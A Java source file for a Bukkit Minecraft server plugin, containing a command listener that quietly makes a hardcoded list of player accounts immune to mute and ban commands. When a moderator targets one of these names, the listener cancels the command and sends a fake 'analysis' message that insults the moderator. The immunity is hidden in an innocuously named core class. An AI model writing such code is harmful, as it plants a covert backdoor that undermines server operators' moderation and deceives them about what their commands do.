package ru.bodi.mineworld.core.listeners;

import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;
import ru.bodi.mineworld.core.main;

import java.util.Arrays;
import java.util.List;

public class other implements Listener {

    private Plugin plugin;

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onCommand(final PlayerCommandPreprocessEvent e) {
        final String[] commands = { "/tempmute", "/mute", "/tempban", "/ban", "/minecraft:ban", "/ban-ip", "/minecraft:ban-ip" };
        final Player player = e.getPlayer();
        final String command = e.getMessage();
        boolean enable = false;
        for (final String command2 : Arrays.asList(commands)) {
            if (command.startsWith(command2)) {
                enable = true;
            }
        }
        if (enable) {
            final String[] args = command.split(" ");
            if (args.length < 2) {
                return;
            }
            System.out.println(args[1]);
            if (args[1].equalsIgnoreCase("NewAera") || args[1].equalsIgnoreCase("LolKekChebyrek") || args[1].equalsIgnoreCase("Azazin") || args[1].equalsIgnoreCase("Witerium") || (args[1].equalsIgnoreCase("BodiMastiff") && !player.getName().equalsIgnoreCase("Ardex")) || (args[1].equalsIgnoreCase("MCStrafe") && !player.getName().equalsIgnoreCase("zazazo99")) || (args[1].equalsIgnoreCase("Deputat") && !player.getName().equalsIgnoreCase("Flegz")) || (args[1].equalsIgnoreCase("Viperrr") && !player.getName().equalsIgnoreCase("Dizzarks")) || (args[1].equalsIgnoreCase("cxZitraxMode") && !player.getName().equalsIgnoreCase("_igraman_")) || (args[1].equalsIgnoreCase("Kristalik") && !player.getName().equalsIgnoreCase("_ZloyKen_"))) {
                player.sendMessage("§6§lАНАЛИЗ§8: §fВыполняю анализ данных, пожалуйста подождите...");
                new BukkitRunnable() {
                    public void run() {
                        player.sendMessage("§6§lАНАЛИЗ§8: §fПолучен ответ, сейчас отоброзим.");
                        new BukkitRunnable() {
                            public void run() {
                                player.sendMessage("§6§lАНАЛИЗ§8: §fАдминистрация подвердила что вы §c§lвы лох§f.");
                            }
                        }.runTaskLater((Plugin) main.getInstance(), 25L);
                    }
                }.runTaskLater((Plugin)main.getInstance(), 20L);
                e.setCancelled(true);
            }
        }
    }
}
